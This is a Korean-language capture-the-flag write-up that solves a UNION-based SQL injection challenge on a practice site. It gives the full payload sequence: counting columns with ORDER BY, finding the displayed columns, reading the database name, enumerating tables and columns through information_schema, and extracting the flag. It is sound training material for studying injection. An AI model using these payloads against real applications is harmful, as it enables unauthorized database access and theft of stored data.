# DB 데이터 추출 1
UNION SQLi 

http://ctf.segfaulthub.com:9999/sqli_1/search.php

---
adminer 검색
![1](https://user-images.githubusercontent.com/106296883/233787526-f07764db-c6dc-4c4c-b77b-852a3550a401.PNG)

데이터가 4종류 조회된다는 것을 알 수 있음.

select 문으로 db 에서 조회할 것임.

해당 쿼리문의 기본 구조부터 파악해야 함.

admin, dmine 등등 검색을 해본 결과 모두 Adminer 로 검색된다는 것을 확인했음.

like , '%___%' 등의 구조일 것임

```
select ??? from ??? where search like = '%___%'
```
쿼리문은 이것으로 예상.

우선 union 을 활용하려면 컬럼의 개수부터 파악해야 함.   
그렇기에 order by 를 사용해서 컬럼의 개수를 유추할 것임
```
admin%' order by 1 #
통과

admin%' order by 2 #
통과

admin%' order by 3 #
통과

admin%' order by 4 #
통과

admin%' order by 5 #
검색 결과 나오지 않음.

→ 컬럼 개수 = 4
```

컬럼 개수를 파악했으니 이제 union 을 사용할 수 있음.   
union 을 사용해서 화면에 출력되는 데이터의 위치를 파악할 것임.
```
admin%' union select '1','2','3','4
```
![2](https://user-images.githubusercontent.com/106296883/233788006-2003e7b3-b115-497f-8dbf-f72986627f02.PNG)

1,2,3,4 컬럼의 위치를 확인했음.

이제 db 이름부터 확인
```
admin%' union select '1',database(),'3','4
```
![3](https://user-images.githubusercontent.com/106296883/233788044-e218661c-de66-48cc-9a27-4b3c61fe225e.PNG)

db 이름은    
sqli_1

이제 테이블의 이름을 확인해야 함.
```
select table_name from information_schema.tables where table_schema = 'sqli_1'
```
위의 query 문으로 SQL에 입력하면 sqli_1 데이터베이스 table 의 이름이 나옴.   
기본 구조와 결합하여 입력.
``` 
admin%' union select '1',table_name,'3','4' from information_schema.tables where table_schema = 'sqli_1' #
```
![4](https://user-images.githubusercontent.com/106296883/233788175-89dd7855-7c2a-4493-8623-38404e88c74c.PNG)

table 이름을 확인.
	
flag_table   
user_info

테이블 이름 확인했으니까 컬럼 이름도 확인하자.

컬럼 이름 확인하는 쿼리문은   
```
select column_name from informarion_schema.columns where table_name='flag_table'
```
적용하면
```
admin%' union select '1',column_name,'3','4' from information_schema.columns where table_name='flag_table' #
```
![5](https://user-images.githubusercontent.com/106296883/233788309-13052d48-05a2-47c2-9515-f1e0996fed75.PNG)

컬럼 이름도 확인.

그렇다면 이제 데이터를 추출하는 일만 남았음.
```
select flag from flag_table
```

```
admin%' union select '1',flag,'3','4' from flag_table #
```
![6](https://user-images.githubusercontent.com/106296883/233788365-8c12e097-402c-4ffe-9618-cf33378719eb.PNG)

flag 획득!
